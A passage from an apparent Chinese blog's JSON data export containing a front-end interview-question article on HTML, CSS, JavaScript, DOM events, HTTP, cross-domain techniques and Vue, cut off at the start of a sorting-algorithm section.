点击“获得你的公开信息”那行字大概就可以，应该是显示屏分辨率的问题","categories":[{"name":"前端","slug":"前端","permalink":"https://ru23.com/categories/前端/"}],"tags":[{"name":"踩过的坑","slug":"踩过的坑","permalink":"https://ru23.com/tags/踩过的坑/"},{"name":"微信开发","slug":"微信开发","permalink":"https://ru23.com/tags/微信开发/"}]},{"title":"前端开发最全面试题","slug":"2018-09-前端开发最全面试题","date":"2018-09-30T10:13:33.000Z","updated":"2018-10-24T03:46:03.324Z","comments":true,"path":"note/32ee7fe0.html","link":"","permalink":"https://ru23.com/note/32ee7fe0.html","excerpt":"","text":"前端问题记录 HTML相关 CSS相关 JAVASCRIPT相关 DOM相关 HTTP相关 VUE相关 算法相关 网络安全相关 webpack相关 其他Html相关1 html语义化意义：根据内容的结构化（内容语义化），选择合适的标签（代码语义化）便于开发者阅读和写出更优雅的代码的同时让浏览器的爬虫和机器很好地解析。注意：1.尽可能少的使用无语义的标签div和span；2.在语义不明显时，既可以使用div或者p时，尽量用p, 因为p在默认情况下有上下间距，对兼容特殊终端有利；3.不要使用纯样式标签，如：b、font、u等，改用css设置。4.需要强调的文本，可以包含在strong或者em标签中（浏览器预设样式，能用CSS指定就不用他们），strong默认样式是加粗（不要用b），em是斜体（不用i）；5.使用表格时，标题要用caption，表头用thead，主体部分用tbody包围，尾部用tfoot包围。表头和一般单元格要区分开，表头用th，单元格用td；6.表单域要用fieldset标签包起来，并用legend标签说明表单的用途；7.每个input标签对应的说明文本都需要使用label标签，并且通过为input设置id属性，在lable标签中设置for=someld来让说明文本和相对应的input关联起来。 新标签： h5新元素 2 meta viewport相关1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt; H5标准声明，使用 HTML5 doctype，不区分大小写&lt;head lang=”en”&gt; 标准的 lang 属性写法&lt;meta charset=’utf-8′&gt; 声明文档使用的字符编码&lt;meta http-equiv=”X-UA-Compatible” content=”IE=edge,chrome=1″/&gt; 优先使用 IE 最新版本和 Chrome&lt;meta name=”description” content=”不超过150个字符”/&gt; 页面描述&lt;meta name=”keywords” content=””/&gt; 页面关键词&lt;meta name=”author” content=”name, email@gmail.com”/&gt; 网页作者&lt;meta name=”robots” content=”index,follow”/&gt; 搜索引擎抓取&lt;meta name=”viewport” content=”initial-scale=1, maximum-scale=3, minimum-scale=1, user-scalable=no”&gt; 为移动设备添加 viewport&lt;meta name=”apple-mobile-web-app-title” content=”标题”&gt; iOS 设备 begin&lt;meta name=”apple-mobile-web-app-capable” content=”yes”/&gt; 添加到主屏后的标题（iOS 6 新增）是否启用 WebApp 全屏模式，删除苹果默认的工具栏和菜单栏&lt;meta name=”apple-itunes-app” content=”app-id=myAppStoreID, affiliate-data=myAffiliateData, app-argument=myURL”&gt;添加智能 App 广告条 Smart App Banner（iOS 6+ Safari）&lt;meta name=”apple-mobile-web-app-status-bar-style” content=”black”/&gt;&lt;meta name=”format-detection” content=”telphone=no, email=no”/&gt; 设置苹果工具栏颜色&lt;meta name=”renderer” content=”webkit”&gt; 启用360浏览器的极速模式(webkit)&lt;meta http-equiv=”X-UA-Compatible” content=”IE=edge”&gt; 避免IE使用兼容模式&lt;meta http-equiv=”Cache-Control” content=”no-siteapp” /&gt; 不让百度转码&lt;meta name=”HandheldFriendly” content=”true”&gt; 针对手持设备优化，主要是针对一些老的不识别viewport的浏览器，比如黑莓&lt;meta name=”MobileOptimized” content=”320″&gt; 微软的老式浏览器&lt;meta name=”screen-orientation” content=”portrait”&gt; uc强制竖屏&lt;meta name=”x5-orientation” content=”portrait”&gt; QQ强制竖屏&lt;meta name=”full-screen” content=”yes”&gt; UC强制全屏&lt;meta name=”x5-fullscreen” content=”true”&gt; QQ强制全屏&lt;meta name=”browsermode” content=”application”&gt; UC应用模式&lt;meta name=”x5-page-mode” content=”app”&gt; QQ应用模式&lt;meta name=”msapplication-tap-highlight” content=”no”&gt; windows phone 点击无高光设置页面不缓存&lt;meta http-equiv=”pragma” content=”no-cache”&gt;&lt;meta http-equiv=”cache-control” content=”no-cache”&gt;&lt;meta http-equiv=”expires” content=”0″&gt; 3 canvas 相关1234567使用前需要获得上下文环境，暂不支持3d常用api: 1.fillRect(x,y,width,height)实心矩形 2.strokeRect(x,y,width,height)空心矩形 3.fillText(\"Hello world\",200,200);实心文字 4.strokeText(\"Hello world\",200,300)空心文字各种东西！！！ 新标签兼容低版本 ie9之前版本通过createElement创建html5新标签 引入html5shiv.jsCSS相关1.盒模型1.ie盒模型算上border、padding及自身（不算margin），标准的只算上自身窗体的大小css设置方法如下1234/* 标准模型 */box-sizing:content-box; /*IE模型*/box-sizing:border-box; 2.margin、border、padding、content由外到里3.几种获得宽高的方式 dom.style.width/height 这种方式只能取到dom元素内联样式所设置的宽高，也就是说如果该节点的样式是在style标签中或外联的CSS文件中设置的话，通过这种方法是获取不到dom的宽高的。 dom.currentStyle.width/height 这种方式获取的是在页面渲染完成后的结果，就是说不管是哪种方式设置的样式，都能获取到。但这种方式只有IE浏览器支持。 window.getComputedStyle(dom).width/height 这种方式的原理和2是一样的，这个可以兼容更多的浏览器，通用性好一些。 dom.getBoundingClientRect().width/height 这种方式是根据元素在视窗中的绝对位置来获取宽高的 dom.offsetWidth/offsetHeight 这个就没什么好说的了，最常用的，也是兼容最好的。 4.拓展 各种获得宽高的方式 获取屏幕的高度和宽度（屏幕分辨率）：window.screen.height/width 获取屏幕工作区域的高度和宽度（去掉状态栏）：window.screen.availHeight/availWidth 网页全文的高度和宽度：document.body.scrollHeight/Width 滚动条卷上去的高度和向右卷的宽度：document.body.scrollTop/scrollLeft 网页可见区域的高度和宽度（不加边线）：document.body.clientHeight/clientWidth 网页可见区域的高度和宽度（加边线）：document.body.offsetHeight/offsetWidth 5.边距重叠解决方案(BFC)BFC原理 内部的box会在垂直方向，一个接一个的放置每个元素的margin box的左边，与包含块border box的左边相接触（对于从做往右的格式化，否则相反） box垂直方向的距离由margin决定，属于同一个bfc的两个相邻box的margin会发生重叠 bfc的区域不会与浮动区域的box重叠 bfc是一个页面上的独立的容器，外面的元素不会影响bfc里的元素，反过来，里面的也不会影响外面的 计算bfc高度的时候，浮动元素也会参与计算创建bfc float属性不为none（脱离文档流） position为absolute或fixed display为inline-block,table-cell,table-caption,flex,inine-flex overflow不为visible 根元素demo1234567891011&lt;section class=\"top\"&gt; &lt;h1&gt;上&lt;/h1&gt; 这块margin-bottom:30px;&lt;/section&gt;&lt;!-- 给下面这个块添加一个父元素，在父元素上创建bfc --&gt;&lt;div style=\"overflow:hidden\"&gt; &lt;section class=\"bottom\"&gt; &lt;h1&gt;下&lt;/h1&gt; 这块margin-top:50px; &lt;/section&gt;&lt;/div&gt; css reset 和 normalize.css 有什么区别 两者都是通过重置样式，保持浏览器样式的一致性 前者几乎为所有标签添加了样式，后者保持了许多浏览器样式，保持尽可能的一致 后者修复了常见的桌面端和移动端浏览器的bug：包含了HTML5元素的显示设置、预格式化文字的font-size问题、在IE9中SVG的溢出、许多出现在各浏览器和操作系统中的与表单相关的bug。 前者中含有大段的继承链 后者模块化，文档较前者来说丰富居中方法水平方向上1234针对inline, 内联块inline-block, 内联表inline-table, inline-flex元素及img,span,button等元素.text_div&#123; text-align:center;&#125; 1234不定宽块状元素居中.text_div&#123; margin:0 auto;&#125; 12345678910通过给父元素设置 float，然后给父元素设置 position:relative 和 left:50%，子元素设置 position:relative 和 left: -50% 来实现水平居中。.wrap&#123; float:left; position:relative; left:50%; clear:both;&#125;.wrap-center&#123; left:-50%;&#125; 垂直居中1234567单行内联(inline-)元素垂直居中 通过设置内联元素的高度(height)和行高(line-height)相等，从而使元素垂直居中。.text_div&#123; height: 120px; line-height: 120px;&#125; 12345678利用表布局.father &#123; display: table;&#125;.children &#123; display: table-cell; vertical-align: middle;&#125; 123456flex布局.center-flex &#123; display: flex; flex-direction: column;//上下排列 justify-content: center;&#125; 1234567891011121314151617181920绝对布局方式已知高度.parent &#123; position: relative;&#125;.child &#123; position: absolute; top: 50%; height: 100px; margin-top: -50px; &#125;未知高度.parent &#123; position: relative;&#125;.child &#123; position: absolute; top: 50%; transform: translateY(-50%);&#125; 垂直水平居中根据上方结合1234567891011121314flex方式.parent &#123; display: flex; justify-content: center; align-items: center;&#125;grid方式.parent &#123; height: 140px; display: grid;&#125;.child &#123; margin: auto;&#125; css优先级确定 每个选择器都有权值，权值越大越优先 继承的样式优先级低于自身指定样式 ！important优先级最高 js也无法修改 权值相同时，靠近元素的样式优先级高 顺序为内联样式表（标签内部）&gt; 内部样式表（当前文件中）&gt; 外部样式表（外部文件中）bfc内容见盒模型如何清除浮动不清楚浮动会发生高度塌陷：浮动元素父元素高度自适应（父元素不写高度时，子元素写了浮动后，父元素会发生高度塌陷） clear清除浮动（添加空div法）在浮动元素下方添加空div,并给该元素写css样式： {clear:both;height:0;overflow:hidden;} 给浮动元素父级设置高度 父级同时浮动（需要给父级同级元素添加浮动） 父级设置成inline-block，其margin: 0 auto居中方式失效 利用br标签的clear属性 给父级添加overflow:hidden 清除浮动方法 万能清除法 after伪类 清浮动（现在主流方法，推荐使用）1234567891011.float_div:after&#123; content:\".\"; clear:both; display:block; height:0; overflow:hidden; visibility:hidden;&#125;.float_div&#123; zoom:1&#125; 自适应布局思路： 左侧浮动或者绝对定位，然后右侧margin撑开 使用div包含，然后靠负margin形成bfc 使用flex画三角形123456789#item &#123; width: 0; height: 0; border-left: 50px solid transparent; border-right: 50px solid transparent; border-top: 50px solid transparent; border-bottom: 50px solid blue; background: white;&#125; link @import导入css link是XHTML标签，除了加载CSS外，还可以定义RSS等其他事务；@import属于CSS范畴，只能加载CSS。 link引用CSS时，在页面载入时同时加载；@import需要页面网页完全载入以后加载。 link无兼容问题；@import是在CSS2.1提出的，低版本的浏览器不支持。 ink支持使用Javascript控制DOM去改变样式；而@import不支持。animation 长宽比方案 使用padding方式结合calc实现 长宽一项设置百分比另一项aspect-ratio实现（需借助插件实现）display相关 block:div等容器类型 inline:img span等行内类型 table系列：将样式变成table类型 flex:重点把握，非常强大 grid:同上 inline-block:可设置宽度，两者间有一点间隙 inherit:继承父级JavaScript相关1 [“1”, “2”, “3”].map(parseInt)123456789101112131415161718首先, map接受两个参数, 一个回调函数 callback, 一个回调函数的this值其中回调函数接受三个参数 currentValue, index, arrary;而题目中, map只传入了回调函数--parseInt.其次, parseInt 只接受两个两个参数 string, radix(基数). 本题理解来说也就是key与 index 所以本题即问parseInt('1', 0);parseInt('2', 1);parseInt('3', 2);parseInt(string, radix)string 必需。要被解析的字符串。radix 可选。表示要解析的数字的基数。该值介于 2 ~ 36 之间。如果省略该参数或其值为 0，则数字将以 10 为基础来解析。如果它以 “0x” 或 “0X” 开头，将以 16 为基数。 2 [[3,2,1].reduce(Math.pow), [].reduce(Math.pow)]12345arr.reduce(callback[, initialValue])reduce接受两个参数, 一个回调, 一个初始值.回调函数接受四个参数 previousValue, currentValue, currentIndex, array需要注意的是 If the array is empty and no initialValue was provided, TypeError would be thrown.所以第二个表达式会报异常. 第一个表达式等价于 Math.pow(3, 2) =&gt; 9; Math.pow(9, 1) =&gt;9 3123456789var ary = [0,1,2];ary[10] = 10;ary.filter(function(x) &#123; return x === undefined;&#125;);我们看到在迭代这个数组的时候, 首先检查了这个索引值是不是数组的一个属性, 那么我们测试一下.0 in ary; =&gt; true3 in ary; =&gt; false10 in ary; =&gt; true也就是说 从 3 - 9 都是没有初始化的bug !, 这些索引并不存在与数组中. 在 array 的函数调用的时候是会跳过这些坑的. 4 [typeof null, null instanceof Object]123456789101112typeof 返回一个表示类型的字符串.instanceof 运算符用来检测 constructor.prototype 是否存在于参数 object 的原型链上.type resultUndefined \"undefined\"Null \"object\"Boolean \"boolean\"Number \"number\"String \"string\"Symbol \"symbol\"Host object Implementation-dependentFunction \"function\"Object \"object\" 5 js数据类型1.number; 2.string; 3.boolean; 4.undefined; 5.null; 6.symbol（ES6新增，文章后面有对着新类型的解释）Symbol 生成一个全局唯一的值。 7.Object.（包括Object，Array，Function） 6 promise 用法123456789101112131415161718192021定义var promise = new Promise(function(resolve, reject) &#123; // ... some code if (/* 异步操作成功 */)&#123; resolve(value); &#125; else &#123; reject(error); &#125;&#125;);使用promise.then(function(value) &#123; // success&#125;, function(error) &#123; // failure&#125;);//等价于：promise.then(function()&#123; //success&#125;).catch(function()&#123; //failure&#125;) 7 es6 promise ajax123456789101112131415161718192021222324252627定义const myHttpClient = url =&gt; &#123; return new Promise((resolve, reject) =&gt; &#123; let client = new XMLHttpRequest(); client.open(\"GET\", url); client.onreadystatechange = handler; client.responseType = \"json\"; client.setRequestHeader(\"Accept\", \"application/json\"); client.send(); function handler() &#123; if (this.readyState !== 4) &#123; return; &#125; if (this.status === 200) &#123; resolve(this.response); &#125; else &#123; reject(new Error(this.statusText)); &#125; &#125; &#125;);&#125;;使用myHttpClient('https://www.baidu.com').then(res =&gt; &#123; console.log(res);&#125;).catch(error =&gt; &#123; console.log(error);&#125;); 8闭包1234567891011function foo(x) &#123; var tmp = 3; return function (y) &#123; alert(x + y + (++tmp)); &#125;&#125;var bar = foo(2); // bar 现在是一个闭包bar(10);结果是16es6通常用let const块级作用域代替，闭包缺点，ie中会引起内存泄漏，严格来说是ie的缺点不是闭包的问题 9 什么是立即执行函数？使用立即执行函数的目的是什么？1234567891011常见两种方式1.(function()&#123;...&#125;)() (function(x)&#123; console.log(x); &#125;)(12345)2.(function()&#123;...&#125;()) (function(x)&#123; console.log(x); &#125;(12345))作用 不破坏污染全局的命名空间，若需要使用，将其用变量传入如（function(window)&#123;...&#125;(window)） 10 async/await 语法123456789101112131415161718192021222324252627282930作用：异步代码的新方式promise示例const makeRequest = () =&gt; &#123; return getJSON() .then(data =&gt; &#123; if (data.needsAnotherRequest) &#123; return makeAnotherRequest(data) .then(moreData =&gt; &#123; console.log(moreData) return moreData &#125;) &#125; else &#123; console.log(data) return data &#125; &#125;)&#125;async/await示例const makeRequest = async () =&gt; &#123; const data = await getJSON() if (data.needsAnotherRequest) &#123; const moreData = await makeAnotherRequest(data); console.log(moreData) return moreData &#125; else &#123; console.log(data) return data &#125;&#125;函数前面多了一个aync关键字。await关键字只能用在aync定义的函数内。async函数会隐式地返回一个promise，该promise的reosolve值就是函数return的值。(示例中reosolve值就是字符串\"done\") 11 深浅拷贝12345678910111213141516171819202122let a = &#123; aa: 1, bb: 2, cc: 3, dd: &#123; ee: 5, &#125;, ff: &#123; gg: 6, &#125;&#125;;let d = JSON.parse(JSON.stringify(a));//深复制包含子对象let c = &#123;...a&#125;;//深拷贝单不包含子对象let b = a;//浅拷贝b.bb = 22;c.cc = 33;c.dd.ee = 55;d.ff.gg = 66;console.log(a);console.log(b);console.log(c);console.log(d); 12数组去重123456思路1：定义一个新数组，并存放原数组的第一个元素，然后将元素组一一和新数组的元素对比，若不同则存放在新数组中思路2：先将原数组排序，在与相邻的进行比较，如果不同则存入新数组。思路3：利用对象属性存在的特性，如果没有该属性则存入新数组。思路4（最常用）：使用es6 setlet arr= [1, 2, 3, 3, 5, 7, 2, 6, 8];console.log([...new Set(arr)]); 13正则实现trim()功能12345function myTrim(str) &#123; let reg = /^\\s+|\\s+$/g; return str.replace(reg, \"\");&#125;console.log(myTrim(' asdf ')); 14 JS原型121.每个对象都有 __proto__ 属性，但只有函数对象才有 prototype 属性2.个人粗略理解与python的类方法静态方法实例方法差不多 #####15 es6 class1面向对象，java中类 16 JS 如何实现继承121.使用原型继承（既继承了父类的模板，又继承了父类的原型对象。优点是继承了父类的模板，又继承了父类的原型对象，缺点就是父类实例传参，不是子类实例化传参，不符合常规语言的写法）2.使用call的方式（继承了父类的模板，不继承了父类的原型对象。优点是方便了子类实例传参，缺点就是不继承了父类的原型对象） 17 手写jquery插件1234567891011(function ($) &#123; $.fn.myPlugins = function (options) &#123; //参数赋值 options = $.extend(defaults, options);//对象合并 this.each(function () &#123; //执行代码逻辑 &#125;); &#125;;&#125;)(jQuery);$(selector).myPlugins(&#123;参数&#125;); 18 数组合并去重排序12345let arr1 = [1, 25, 2, 26, 1234, 6, 213];let arr2 = [2, 6, 2134, 6, 31, 623];let c = [...new Set([...arr1, ...arr2])].sort((a, b) =&gt; &#123; return a - b;&#125;); 19 call apply作用：在函数调用时改变函数的执行上下文也就是this的值区别：call采用不定长的参数列表，而apply使用一个参数数组。性能优化图 性能优化 20 for 中setTimeOut要为循环题创建不同的循环副本 21 sort函数V8 引擎 sort 函数只给出了两种排序 InsertionSort 和 QuickSort，数量小于10的数组使用 插入，比10大的数组则使用 快排。 22 navigator Navigator 23 jquery绑定方式 click后者覆盖 bind后者覆盖 on(jquery&gt;=1.7) live delegate24 事件流向 冒泡：子节点一层层冒泡到根节点 捕获顺序与冒泡相反 addEventListener最后个参数true代表捕获反之代表冒泡 阻止冒泡不停止父节点捕获25原生操作class123456789101112131415161718192021//判断有无function hasClass(ele, cls) &#123; return ele.className.match(new RegExp(\"(\\\\s|^)\" + cls + \"(\\\\s|$)\"));&#125;//添加function addClass(ele, cls) &#123; if (!this.hasClass(ele, cls)) ele.className += \" \" + cls;&#125;//删除function removeClass(ele, cls) &#123; if (hasClass(ele, cls)) &#123; let reg = new RegExp(\"(\\\\s|^)\" + cls + \"(\\\\s|$)\"); ele.className = ele.className.replace(reg, \" \"); &#125;&#125;html5中加入classList 一系列操作兼容至IE10 DOM相关dom事件模型DOM之事件模型分脚本模型、内联模型(同类一个，后者覆盖)、动态绑定(同类多个)demo12345678910111213141516171819202122232425262728293031323334353637&lt;body&gt;&lt;!--行内绑定：脚本模型--&gt;&lt;button onclick=\"javascrpt:alert('Hello')\"&gt;Hello1&lt;/button&gt;&lt;!--内联模型--&gt;&lt;button onclick=\"showHello()\"&gt;Hello2&lt;/button&gt;&lt;!--动态绑定--&gt;&lt;button id=\"btn3\"&gt;Hello3&lt;/button&gt;&lt;/body&gt;&lt;script&gt;/*DOM0：同一个元素，同类事件只能添加一个，如果添加多个，* 后面添加的会覆盖之前添加的*/function shoeHello() &#123;alert(\"Hello\");&#125;var btn3 = document.getElementById(\"btn3\");btn3.onclick = function () &#123;alert(\"Hello\");&#125;/*DOM2:可以给同一个元素添加多个同类事件*/btn3.addEventListener(\"click\",function () &#123;alert(\"hello1\");&#125;);btn3.addEventListener(\"click\",function () &#123;alert(\"hello2\");&#125;)if (btn3.attachEvent)&#123;/*IE*/btn3.attachEvent(\"onclick\",function () &#123;alert(\"IE Hello1\");&#125;)&#125;else &#123;/*W3C*/btn3.addEventListener(\"click\",function () &#123;alert(\"W3C Hello\");&#125;)&#125;&lt;/script&gt; 冒泡解释：当点击一个元素触发事件时. 事件会先从元素的最外层父元素一层一层进入到触发的元素, 然后在从触发元素一层一层返回到最外层父元素, 从最外层一层一层进入的阶段叫事件捕获阶段, 从最里层一层一层往外的阶段叫事件冒泡, 移动端触摸事件①touchstart：当手指触碰到屏幕的时候触发②touchmove：当手指在屏幕上滑动的时候触发③touchend：当手指离开屏幕的时候时候触发④touchcancel事件：当系统停止跟踪触摸的时候触发(这个事件很少会用，一般不做深入研究)。 电话接入或者弹出信息等其他事件切入event： touches：表示当前跟踪的触摸操作的touch对象的数组。 targetTouches：特定于事件目标的Touch对象的数组。 changeTouches：表示自上次触摸以来发生了什么改变的Touch对象的数组。 每个touch对象包含的属性 clientX：触摸目标在视口中的x坐标。 clientY：触摸目标在视口中的y坐标。 identifier：标识触摸的唯一ID。 pageX：触摸目标在页面中的x坐标。 pageY：触摸目标在页面中的y坐标。 screenX：触摸目标在屏幕中的x坐标。 screenY：触摸目标在屏幕中的y坐标。 target：触目的DOM节点目标。 事件委托参考定义：事件委托就是利用事件冒泡，只指定一个事件处理程序，就可以管理某一类型的所有事件好处：给重复的节点添加相同操作，减少dom交互，提高性能实现思路：给父组件添加事件，通过事件冒泡，排查元素是否为指定元素，并进行系列操作 HTTP相关常见状态码2开头 （请求成功）表示成功处理了请求的状态代码。 200 （成功） 服务器已成功处理了请求。 通常，这表示服务器提供了请求的网页。201 （已创建） 请求成功并且服务器创建了新的资源。202 （已接受） 服务器已接受请求，但尚未处理。203 （非授权信息） 服务器已成功处理了请求，但返回的信息可能来自另一来源。204 （无内容） 服务器成功处理了请求，但没有返回任何内容。205 （重置内容） 服务器成功处理了请求，但没有返回任何内容。206 （部分内容） 服务器成功处理了部分 GET 请求。 3开头 （请求被重定向）表示要完成请求，需要进一步操作。 通常，这些状态代码用来重定向。 300 （多种选择） 针对请求，服务器可执行多种操作。 服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。301 （永久移动） 请求的网页已永久移动到新位置。 服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。302 （临时移动） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。303 （查看其他位置） 请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。304 （未修改） 自从上次请求后，请求的网页未修改过。 服务器返回此响应时，不会返回网页内容。305 （使用代理） 请求者只能使用代理访问请求的网页。 如果服务器返回此响应，还表示请求者应使用代理。307 （临时重定向） 服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 4开头 （请求错误）这些状态代码表示请求可能出错，妨碍了服务器的处理。 400 （错误请求） 服务器不理解请求的语法。401 （未授权） 请求要求身份验证。 对于需要登录的网页，服务器可能返回此响应。403 （禁止） 服务器拒绝请求。404 （未找到） 服务器找不到请求的网页。405 （方法禁用） 禁用请求中指定的方法。406 （不接受） 无法使用请求的内容特性响应请求的网页。407 （需要代理授权） 此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。408 （请求超时） 服务器等候请求时发生超时。409 （冲突） 服务器在完成请求时发生冲突。 服务器必须在响应中包含有关冲突的信息。410 （已删除） 如果请求的资源已永久删除，服务器就会返回此响应。411 （需要有效长度） 服务器不接受不含有效内容长度标头字段的请求。412 （未满足前提条件） 服务器未满足请求者在请求中设置的其中一个前提条件。413 （请求实体过大） 服务器无法处理请求，因为请求实体过大，超出服务器的处理能力。414 （请求的 URI 过长） 请求的 URI（通常为网址）过长，服务器无法处理。415 （不支持的媒体类型） 请求的格式不受请求页面的支持。416 （请求范围不符合要求） 如果页面无法提供请求的范围，则服务器会返回此状态代码。417 （未满足期望值） 服务器未满足”期望”请求标头字段的要求。 5开头（服务器错误）这些状态代码表示服务器在尝试处理请求时发生内部错误。 这些错误可能是服务器本身的错误，而不是请求出错。 500 （服务器内部错误） 服务器遇到错误，无法完成请求。501 （尚未实施） 服务器不具备完成请求的功能。 例如，服务器无法识别请求方法时可能会返回此代码。502 （错误网关） 服务器作为网关或代理，从上游服务器收到无效响应。503 （服务不可用） 服务器目前无法使用（由于超载或停机维护）。 通常，这只是暂时状态。504 （网关超时） 服务器作为网关或代理，但是没有及时从上游服务器收到请求。505 （HTTP 版本不受支持） 服务器不支持请求中所用的 HTTP 协议版本。 缓存 Expires在http1.0中使用，与服务器时间有误差，在1.1中由Cache-control替代 cdn Cache-Control 和 Etag 的区别如下图 区别图 Cookie sessionStorage localStorage共同点：都是保存在浏览器端，且同源的。区别：cookie数据始终在同源的http请求中携带，即cookie在浏览器和服务器间来回传递。而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。cookie数据不能超过4k(适合保存小数据)。sessionStorage和localStorage容量较大，数据有效期不同，sessionStorage：仅在当前浏览器窗口关闭前有效。localStorage：始终有效，窗口或浏览器关闭也一直保存，需手动清楚；cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。作用域不同。sessionStorage不在不同的浏览器窗口中共享；localStorage 在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的。 应用场景：localStorage：常用于长期登录（+判断用户是否已登录），适合长期保存在本地的数据。sessionStorage ：敏感账号一次性登录； cookies与服务器交互。 GET POST区别 get_post 请求行，请求头，请求体详解 如图 1,2,3请求行，4请求体，5请求体 跨域、JSONP 、CORS、postMessage跨域概念解释：当前发起请求的域与该请求指向的资源所在的域不一样。这里的域指的是这样的一个概念：我们认为若协议 + 域名 + 端口号均相同，那么就是同域。如下表 图 jsoup实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849原生&lt;script&gt; var script = document.createElement('script'); script.type = 'text/javascript'; // 传参并指定回调执行函数为onBack script.src = 'http://www.domain2.com:8080/login?user=admin&amp;callback=onBack'; document.head.appendChild(script); // 回调执行函数 function onBack(res) &#123; alert(JSON.stringify(res)); &#125; &lt;/script&gt; jquery$.ajax(&#123; url: 'http://www.domain2.com:8080/login', type: 'get', dataType: 'jsonp', // 请求方式为jsonp jsonpCallback: \"onBack\", // 自定义回调函数名 data: &#123;&#125;&#125;);vuethis.$http.jsonp('http://www.domain2.com:8080/login', &#123; params: &#123;&#125;, jsonp: 'onBack'&#125;).then((res) =&gt; &#123; console.log(res); &#125;)配合的后端node实现,其他服务器语言也可以const querystring = require('querystring');const http = require('http');const server = http.createServer();server.on('request', function(req, res) &#123; var params = qs.parse(req.url.split('?')[1]); var fn = params.callback; // jsonp返回设置 res.writeHead(200, &#123; 'Content-Type': 'text/javascript' &#125;); res.write(fn + '(' + JSON.stringify(params) + ')'); res.end();&#125;);server.listen('8080');jsoup缺点只能实现get请求 CORS：跨源资源共享 Cross-Origin Resource Sharing(CORS)，通常服务器设置，若带cookie请求，则前后端都需要设置后端常见设置response.setHeader(“Access-Control-Allow-Origin”, “http://www.domain1.com&quot;); // 若有端口需写全（协议+域名+端口），允许那些外源请求response.setHeader(“Access-Control-Allow-Credentials”, “true”); //是否需要验证 前端示例 1234567891011121314151617181920212223原生var xhr = new XMLHttpRequest(); // IE8/9需用window.XDomainRequest兼容// 前端设置是否带cookiexhr.withCredentials = true;xhr.open('post', 'http://www.domain2.com:8080/login', true);xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');xhr.send('user=admin'); xhr.onreadystatechange = function() &#123; if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) &#123; alert(xhr.responseText); &#125;jquery$.ajax(&#123; ... xhrFields: &#123; withCredentials: true // 前端设置是否带cookie &#125;, crossDomain: true, // 会让请求头中包含跨域的额外信息，但不会含cookie ...&#125;); 12345678910111213141516171819202122232425262728293031323334353637postMessage(data,origin)方法接受两个参数demoa.html&lt;iframe id=\"iframe\" src=\"http://www.domain2.com/b.html\" style=\"display:none;\"&gt;&lt;/iframe&gt;&lt;script&gt; var iframe = document.getElementById('iframe'); iframe.onload = function() &#123; var data = &#123; name: 'aym' &#125;; // 向domain2传送跨域数据 iframe.contentWindow.postMessage(JSON.stringify(data), 'http://www.domain2.com'); &#125;; // 接受domain2返回数据 window.addEventListener('message', function(e) &#123; alert('data from domain2 ---&gt; ' + e.data); &#125;, false);&lt;/script&gt;b.html 与a.html不同源&lt;script&gt; // 接收domain1的数据 window.addEventListener('message', function(e) &#123; alert('data from domain1 ---&gt; ' + e.data); var data = JSON.parse(e.data); if (data) &#123; data.number = 16; // 处理后再发回domain1 window.parent.postMessage(JSON.stringify(data), 'http://www.domain1.com'); &#125; &#125;, false);&lt;/script&gt; osi模型七层结构：物理层、数据链路层、网络层、传输层、会话层、表示层、应用层tcp ucp属于传输层；http属于应用层 http2.0 http1 HTTP2.0的基本单位为二进制帧 HTTP2.0中帧具有优先级 HTTP2.0的多路复用（ 1次连接） HTTP2.0压缩消息头 HTTP2.0服务端推送 HTTP2.0只适用于HTTPS的场景Vue相关 生命周期顺序 生命周期 组件通信1.父传子用props,父用子用ref 子调父用$emit,无关系用Bus Vuex组件通信库，可以避免子组件无法改变props的弊端等mutations 同步操作， 用于改变状态 官方不推荐异步action 执行多个mutaions，官方推荐异步操作mapState、mapGetters、mapActions使用示例123456789101112131415161718&lt;template&gt; &lt;el-dialog :visible.sync=\"show\"&gt;&lt;/el-dialog&gt;&lt;/template&gt;&lt;script&gt;import &#123;mapState&#125; from 'vuex';export default &#123; computed:&#123; //这里的三点叫做 : 扩展运算符 ...mapState(&#123; show:state=&gt;state.dialog.show &#125;), &#125;&#125;&lt;/script&gt;后两者类似 VueRouter123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185定义var routes = [ &#123; path:\"/one\", component:导入的组件1 &#125;, &#123; path:\"/two\", component:导入的组件2 &#125;,];// 定义路由组件var router = new VueRouter(&#123; routes&#125;);// 定义路由new Vue(&#123; el:\"#box\", router&#125;); 访问设定的路由后 会将&lt;router-view&gt;&lt;/router-view&gt;替换成相应的模版 html访问方式 &lt;router-link to=\"/one\"&gt;One&lt;/router-link&gt;(类似a标签) js访问方式 this.$router.push('/one'); replace方式 替换当前页面 携带的参数 可以通过this.$route.query.xxxx来获取``` ##### Vue双向绑定原理：利用了 Object.defineProperty() 这个方法重新定义了对象获取属性值(get)和设置属性值(set)的操作来实现的。缺点：双向数据流是自动管理状态的, 但是在实际应用中会有很多不得不手动处理状态变化的逻辑, 使得程序复杂度上升, 难以调试。##### computed watch methods用法：区别：1. 前两者自动追踪数据，执行相关函数，最后一个手动调用；2. computed是计算属性，用法与data一致3. watch像事件监听，对象发生变化时，执行相关操作4. methods与js中执行方法类似5. computed通常只有get属性6. 数据变化的同时进行异步操作或者是比较大的开销，那么watch为最佳选择7. watch的对象必须事先声明#### &lt;div id=\"sort\"&gt;算法相关&lt;/div&gt;##### 各种排序实现相关数据![表格](http://pd4ar0u4q.bkt.clouddn.com/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E7%AD%89%E7%AD%89.png)```javascript// 冒泡排序: 